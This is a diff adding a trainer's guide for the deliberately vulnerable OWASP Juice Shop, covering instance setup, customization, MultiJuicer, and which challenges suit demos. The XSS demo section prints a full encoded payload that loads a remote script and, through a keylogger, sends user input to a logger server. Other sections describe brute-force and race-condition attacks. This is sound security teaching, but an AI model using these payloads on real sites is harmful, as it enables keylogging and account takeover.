@@ -1,0 +1,283 @@
+= Trainer's guide[[_trainers_guide]]
+include::../attributes.adoc[]
+
+Co-authored by https://github.com/wurstbrot[Timo Pagel]
+
+== Instances
+
+Make sure all participants have their own running Juice Shop instance to
+work with. While attempting challenges like
+xref:part2/insecure-deserialization.adoc#_rce[RCE] or xref:part2/xxe.adoc#_xxe[XXE]
+students might occasionally take down their server and would severely
+impact other participants if they shared an instance.
+
+There are multiple xref:part1/running.adoc#_run_options[Run Options] which
+you can choose from. It is perfectly fine to run multiple docker
+containers on one host. They do not effect each other.
+
+== Customization
+
+Especially in awareness trainings for management you might want to
+create a higher immersion by making the Juice Shop look like an
+application in the corporate design of the participants' own company.
+Juice Shop offers
+xref:part1/customization.adoc#customization[various customization options] to achieve
+this.
+
+Several custom configurations already come packaged with the Juice Shop
+source code, the two most sophisticated ones being
+https://github.com/juice-shop/juice-shop/blob/master/config/7ms.yml[7 Minute Security]
+and
+https://github.com/juice-shop/juice-shop/blob/master/config/mozilla.yml[Mozilla].
+
+In addition, you might want to disable all challenge notifications
+during awareness trainings to avoid distraction. The
+https://github.com/juice-shop/juice-shop/blob/master/config/quiet.yml[Quiet]
+configuration demonstrates the necessary options to achieve this.
+
+image::appendix/quiet_mode.png[Quiet mode]
+
+For a really sophisticated and immersive demo consider performing some
+xref:part1/customization.adoc#_additional_browser_tweaks[Additional Browser tweaks].
+These will let you use OAuth2 login via Google and cast the illusion
+that coupon codes were actually tweeted by your customer's company.
+
+== Classroom hints
+
+In a class room setup you have to find a way to distribute the URL of
+each instance to the participants. For small groups, it is probably fine
+to just spin up a number of containers and tell all participants which
+URL they have to use. An example to spin up 10 Docker containers on a
+UNIX based system is to run
+
+----
+for i in {10..19}; do docker run -d -p 40$i:3000 bkimminich/juice-shop; done
+----
+
+If you want to track progress centrally during the training, you might
+want to xref:part1/ctf.adoc#_hosting_a_ctf_event[host a central CTF server] where participants
+can post the challenges they already solved. You might consider turning
+off public visibility of the leader board on the CTF server unless you
+want to encourage the students to hack very competitively.
+
+=== Hosting individual instances for multiple users
+
+image::appendix/multi-juicer_cover.svg[MultiJuicer cover]
+
+A solution to host and manage individual Juice Shop instances for
+multiple users is
+https://github.com/iteratec/multi-juicer/[MultiJuicer]. MultiJuicer is
+a Kubernetes based system to start up the required Juice Shop instances
+on demand. It will also clean up unused instances after a configured
+period of inactivity.
+
+MultiJuicer comes with a custom-built load balancer. It allows every
+participant (or a CTF team) to use the same URL, but their traffic will
+always be sent to their own personal instance.
+
+image::appendix/multi-juicer_high-level-architecture.png[MultiJuicer high level architecture]
+
+Registration at MultiJuicer is very straightforward for the users/teams.
+Messing with other instances is prevented by assigning a passcode to
+each of them which should only be shared among team members - or not at
+all for individuals.
+
+image::appendix/multi-juicer_register.png[MultiJuicer registration]
+
+MultiJuicer comes with a rudimentary Score Board of its own, which allows teams to compare their progress through
+the Juice Shop challenges.
+
+image::appendix/multi-juicer_scoreboard.png[MultiJuicer score board]
+
+Another helpful feature for the trainer MultiJuicer is the https://github.com/iteratec/multi-juicer/blob/master/guides/monitoring-setup/monitoring.adoc[optional
+dashboard which automatically consumes and displays metrics] from each of
+its Juice Shop instances. It shows individual challenge progress along with other
+functional and technical stats and can be very helpful in
+troubleshooting as well.
+
+image:appendix/multi-juicer_dashboard.png[MultiJuicer dashboard with technical metrics]
+image:appendix/multi-juicer_dashboard1.png[MultiJuicer dashboard with business metrics]
+
+The MultiJuicer repository offers guidance on https://github.com/iteratec/multi-juicer#installation-guides-for-specific-cloud-providers[how to set up the
+system on different cloud provider platforms],
+such as Digital Ocean, OpenShift, AWS or Azure.
+
+== Existing trainings
+
+One existing training which uses the Juice Shop for example is
+https://drive.google.com/open?id=1ITkTAALjZJnGV-hhAZ-zQfNx1sVTzlA2UlWD0s270ig[Timo Pagel's University Module].
+The structure mostly is as follows:
+
+. Introduce a topic (e.g. SQL Injection)
+. Let the participants try it out in the Juice Shop
+. Show mitigation/counter measures
+
+The 2nd semester web attack chapters of
+https://github.com/bkimminich/it-security-lecture[Björn Kimminich's IT Security Lecture]
+follow a similar pattern of
+
+. Introduction
+. Timeboxed exercise
+. Demonstration of the hack (for all who did not finish the exercise in
+time)
+. Explaining mitigation and prevention
+
+You can find more links to existing material in the
+https://github.com/juice-shop/juice-shop/blob/master/REFERENCES.adoc#lectures-and-trainings[Lectures and Trainings section]
+of the project references on on GitHub.
+
+== Challenges for demos
+
+The following challenges are well suited for live demonstrations in
+trainings or talks. You should *always* begin by showing how to find
+the
+xref:part2/score-board.adoc#_find_the_carefully_hidden_score_board_page[Score Board]
+( ⭐ ) so you can then pick any of the challenge below to further
+demonstrate certain categories of vulnerabilities.
+
+|===
+| Challenge | Category | Difficulty | Time for demo | Dependencies
+
+| xref:part2/xss.adoc#_perform_a_dom_xss_attack[DOM XSS]
+| XSS
+| ⭐
+| ⏳
+| None
+
+| xref:part2/sensitive-data-exposure.adoc#_access_a_confidential_document[Confidential Document]
+| Sensitive Data Exposure
+| ⭐
+| ⏳
+| None
+
+| xref:part2/injection.adoc#_log_in_with_the_administrators_user_account[Login Admin]
+| Injection
+| ⭐⭐
+| ⏳
+| None
+
+| xref:part2/miscellaneous.adoc#_read_our_privacy_policy[Privacy Policy]
+| Miscellaneous
+| ⭐
+| ⏳
+| Log in as any user
+
+| xref:part2/xss.adoc#_perform_a_reflected_xss_attack[Reflected XSS]
+| XSS
+| ⭐⭐
+| ⏳⏳
+| Log in as any user and complete checkout process (to find the vulnerable tracking link)
+
+| xref:part2/security-through-obscurity.adoc#_prove_that_you_actually_read_our_privacy_policy[Privacy Policy Inspection]
+| Security through Obscurity
+| ⭐⭐⭐
+| ⏳⏳
+| xref:part2/miscellaneous.adoc#_read_our_privacy_policy[Privacy Policy]
+
+| xref:part2/broken-access-control.adoc#_access_the_administration_section_of_the_store[Admin Section]
+| Broken Access Control
+| ⭐⭐
+| ⏳⏳
+| xref:part2/injection.adoc#_log_in_with_the_administrators_user_account[Login Admin] or xref:part2/improper-input-validation.adoc#_register_as_a_user_with_administrator_privileges[Admin Registration]
+
+| xref:part2/broken-access-control.adoc#_view_another_users_shopping_basket[View Basket]
+| Broken Access Control
+| ⭐⭐
+| ⏳⏳
+| Log in with two different users
+
+| xref:part2/broken-access-control.adoc#_find_the_hidden_easter_egg[Easter Egg]
+| Broken Access Control
+| ⭐⭐⭐⭐
+| ⏳⏳⏳
+| Explain _Poison Null Byte_
+
+| xref:part2/cryptographic-issues.adoc#_apply_some_advanced_cryptanalysis_to_find_the_real_easter_egg[Nested Easter Egg]
+| Cryptographic Issues
+| ⭐⭐⭐⭐
+| ⏳⏳⏳
+| xref:part2/broken-access-control.adoc#_find_the_hidden_easter_egg[Easter Egg]
+
+| xref:part2/sensitive-data-exposure.adoc#_access_a_developers_forgotten_backup_file[Forgotten Developer Backup]
+| Sensitive Data Exposure
+| ⭐⭐⭐⭐
+| ⏳⏳⏳
+| Explain _Poison Null Byte_
+
+| xref:part2/cryptographic-issues.adoc#_forge_a_coupon_code_that_gives_you_a_discount_of_at_least_80[Forged Coupon]
+| Cryptographic Issues
+| ⭐⭐⭐⭐⭐⭐
+| ⏳⏳⏳⏳
+| xref:part2/sensitive-data-exposure.adoc#_access_a_developers_forgotten_backup_file[Forgotten Developer Backup] and `z85-cli` installed *or* xref:part2/sensitive-data-exposure.adoc#_access_a_salesmans_forgotten_backup_file[Forgotten Sales Backup] *or* tracing coupons from Twitter back to https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22
+|===
+
+=== XSS demo
+
+A particularly impressive
+https://github.com/wurstbrot/shake-logger[showcase of XSS site-defacement combined with a keylogger]
+is provided explicitly for live demos and awareness trainings:
+
+. Install https://www.docker.com/[Docker].
+. Run `+git clone https://github.com/wurstbrot/shake-logger+`.
+. Run `cd shake-logger` and then `docker-compose up`.
+. Turn on your speakers and make sure your browser is allowed to play
+sound.
+. Open
+http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp[this link]
+to launch the XSS demo (🔊).
+. Use the application normally, e.g. doing a search and logging in with
+some user.
+. In a new tab go to http://localhost:8080/logger.php to see that all
+user input was transmitted to a third-party server.
+. Show the Network tab of the browser window with Juice Shop to see the
+requests that are sent to the `logger.php` script.
+. Reload the Juice Shop with `F5` and use the application a bit more.
+. You will see that no more logging takes place as XSS payload was
+removed during the reload.
+
+There is also a video recording available on YouTube:
+https://youtu.be/Msi52Kicb-w. This is a good fallback in case the
+Docker-based setup does not work for you.
+
+== Teaching automation of security tools
+
+Only a few challenges in OWASP Juice Shop are _explicitly_ expecting to
+utilize the power of automation, mostly in the form of some brute force
+attack. Quite a few more challenges are still _well-suited_ for teaching
+the use of automated tools . The following table gives you an idea on
+complexity and expected time consumption for each of these, so you can
+plan your training accordingly.
+
+|===
+| Tool | Description | Effort to automate | Execution runtime | Challenges (Auto-solve?)
+
+| OWASP ZAP _Traditional Spider_ or  _Forced Browse_ with https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-small.txt[small (or bigger) OWASP DirBuster list]
+| Finds `/ftp` folder with many misplaced files _and_ `/promotion` (and direct `/video`) path with jingle video
+| 🧠
+| ⏳⏳
+| Confidential Document(❌), Forgotten Developer Backup(❌), Forgotten Sales Backup(❌), Misplaced Signature File(❌), Login Support Team(❌), Video XSS(❌)
+
+| OWASP ZAP _Forced Browse_ with https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-big.txt[big OWASP DirBuster list]
+| Finds `/encryptionkeys` directory with `jwt.pub` _and_ `premium.key` key files
+| 🧠
+| ⏳⏳⏳
+| Forged Signed JWT(❌), Premium Challenge(❌)
+
+| https://github.com/aaronhnatiw/race-the-web[RaceTheWeb] config (or custom Bash, Python etc. script) sending 10 sequential `POST` requests to http://localhost:3000/api/Feedbacks[Feedback API endpoint] within 10 seconds
+| Must pin `captchaId` and `captcha` from one initially received and solved CAPTCHA
+| 🧠(🧠)
+| ⏳
+| CAPTCHA Bypass(✔️)
+
+| Burpsuite (Community Edition) _Repeater_ with https://www.ssa.gov/oact/babynames/decades/century.html[Top Names Over the Last 100 Years] into http://localhost:3000/rest/user/reset-password[Password Reset API endpoint] for email `jim@juice-sh.op`
+| Contains answer to Jim's security question as 44th of Top 100 male names of 1919-2018. List needs to be manually prepared from HTML page.
+| 🧠🧠
+| ⏳⏳
+| Reset Jim's Password(✔️)
+
+| https://github.com/aaronhnatiw/race-the-web[RaceTheWeb] config (or custom Bash, Python etc. script) sending 3 simultaneous `POST` requests to http://localhost:3000/rest/products/reviews[Like Reviews API endpoint]
+| Requests must be processed within 150ms time window to exploit race condition flaw
+| 🧠(🧠🧠)
+| ⏳
+| Multiple Likes(✔️)
+|===
